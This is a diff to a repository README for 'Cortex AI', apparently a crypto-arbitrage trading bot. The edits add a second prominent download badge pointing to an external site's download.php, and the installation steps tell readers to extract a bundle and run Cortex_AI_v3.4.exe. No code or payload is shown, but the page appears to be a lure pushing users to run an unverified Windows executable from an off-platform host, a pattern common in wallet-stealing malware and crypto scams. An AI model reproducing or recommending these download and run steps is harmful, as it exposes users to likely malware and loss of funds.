@@ -17,13 +17,11 @@
   <img src="https://i.postimg.cc/s2sv7GP8/cortex.png" alt="Cortex AI Arbitrage Dashboard Interface">
 </p>
 
-<p align="center">
-  <b>Official Website:</b> <a href="https://arbitrage-bot.pro/">https://arbitrage-bot.pro/</a>
-</p>
+
 
 <p align="center">
   <a href="https://arbitrage-bot.pro/download.php">
-    <img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI">
+    <img src="https://img.shields.io/badge/DOWNLOAD-🤖Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI">
   </a>
 </p>
 
@@ -47,6 +45,12 @@ Deploying the Cortex infrastructure requires no external developer dependencies.
 ### ⬇️ Distribution & Installation
 
 To launch the secure native production client environment:
+
+
+  <a href="https://arbitrage-bot.pro/download.php">
+    <img src="https://img.shields.io/badge/DOWNLOAD-🤖Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI">
+  </a>
+
 
 1. **Archive Ingestion:** Extract the binary bundle securely into an isolated system directory.
 2. **Environment Activation:** Initiate `Cortex_AI_v3.4.exe` to trigger the cryptographic node generation setup wizard.
